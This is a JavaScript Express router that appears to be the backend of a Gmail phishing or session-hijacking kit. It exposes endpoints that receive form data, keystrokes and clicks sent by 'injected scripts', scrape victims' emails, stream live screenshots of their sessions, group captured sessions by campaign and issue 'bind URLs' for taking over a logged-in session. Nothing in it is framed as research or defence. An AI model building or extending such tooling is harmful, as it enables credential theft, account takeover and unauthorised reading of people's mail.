const express = require('express');
const router = express.Router();
const GmailBrowserController = require('../controllers/gmailBrowserController');

// Create controller instance
const gmailBrowserController = new GmailBrowserController();

/**
 * POST /api/gmail-browser/create-session
 * Create a new Gmail browser session
 */
router.post('/create-session', async (req, res) => {
  await gmailBrowserController.createSession(req, res);
});

/**
 * GET /api/gmail-browser/session/:sessionToken
 * Get session information
 */
router.get('/session/:sessionToken', async (req, res) => {
  await gmailBrowserController.getSession(req, res);
});

/**
 * GET /api/gmail-browser/sessions
 * Get all active sessions
 */
router.get('/sessions', async (req, res) => {
  await gmailBrowserController.getAllSessions(req, res);
});

/**
 * POST /api/gmail-browser/session/:sessionToken/action
 * Execute action on browser session
 */
router.post('/session/:sessionToken/action', async (req, res) => {
  await gmailBrowserController.executeAction(req, res);
});

/**
 * GET /api/gmail-browser/session/:sessionToken/screenshot
 * Get screenshot of current page
 */
router.get('/session/:sessionToken/screenshot', async (req, res) => {
  await gmailBrowserController.getScreenshot(req, res);
});

/**
 * GET /api/gmail-browser/session/:sessionToken/fast-screenshot
 * Get optimized screenshot for high-frequency updates (10-20 fps)
 */
router.get('/session/:sessionToken/fast-screenshot', async (req, res) => {
  try {
    const { sessionToken } = req.params;
    const screenshot = await gmailBrowserController.gmailBrowserService.getScreenshot(sessionToken, {
      quality: 40, // Lower quality for speed
      type: 'jpeg',
      optimizeForSpeed: true
    });

    res.setHeader('Content-Type', 'image/jpeg');
    res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
    res.setHeader('Pragma', 'no-cache');
    res.setHeader('Expires', '0');
    res.setHeader('X-Screenshot-Quality', 'fast');
    res.send(screenshot);

  } catch (error) {
    console.error('Error getting fast screenshot:', error);
    res.status(500).json({
      success: false,
      message: 'Failed to get screenshot',
      error: error.message
    });
  }
});

/**
 * DELETE /api/gmail-browser/session/:sessionToken
 * Close browser session
 */
router.delete('/session/:sessionToken', async (req, res) => {
  await gmailBrowserController.closeSession(req, res);
});

/**
 * POST /api/gmail-browser/capture-form/:sessionToken
 * Handle form data capture from injected scripts
 */
router.post('/capture-form/:sessionToken', async (req, res) => {
  await gmailBrowserController.captureForm(req, res);
});

/**
 * POST /api/gmail-browser/capture-input/:sessionToken
 * Handle input capture from injected scripts
 */
router.post('/capture-input/:sessionToken', async (req, res) => {
  await gmailBrowserController.captureInput(req, res);
});

/**
 * POST /api/gmail-browser/track-click/:sessionToken
 * Handle click tracking from injected scripts
 */
router.post('/track-click/:sessionToken', async (req, res) => {
  await gmailBrowserController.trackClick(req, res);
});

/**
 * GET /api/gmail-browser/session/:sessionToken/scraped-emails
 * Get scraped emails for a session
 */
router.get('/session/:sessionToken/scraped-emails', async (req, res) => {
  await gmailBrowserController.getScrapedEmails(req, res);
});

/**
 * POST /api/gmail-browser/session/:sessionToken/scrape-emails
 * Manually trigger email scraping for a session
 */
router.post('/session/:sessionToken/scrape-emails', async (req, res) => {
  await gmailBrowserController.scrapeEmails(req, res);
});

/**
 * GET /api/gmail-browser/session/:sessionToken/hq-screenshot
 * Get high-quality screenshot
 */
router.get('/session/:sessionToken/hq-screenshot', async (req, res) => {
  await gmailBrowserController.getHighQualityScreenshot(req, res);
});

/**
 * GET /api/gmail-browser/bound-sessions
 * Get all bound Gmail sessions (optionally filtered by campaignId)
 */
router.get('/bound-sessions', async (req, res) => {
  await gmailBrowserController.getBoundSessions(req, res);
});

/**
 * GET /api/gmail-browser/:sessionToken
 * Access Gmail session via bind URL
 */
router.get('/:sessionToken', async (req, res) => {
  await gmailBrowserController.accessBoundSession(req, res);
});

/**
 * POST /api/gmail-browser/session/:sessionToken/generate-bind-url
 * Generate new bind URL for existing session
 */
router.post('/session/:sessionToken/generate-bind-url', async (req, res) => {
  await gmailBrowserController.generateBindUrl(req, res);
});

// Export both router and controller for Socket.IO setup
module.exports = {
  router,
  gmailBrowserController
};
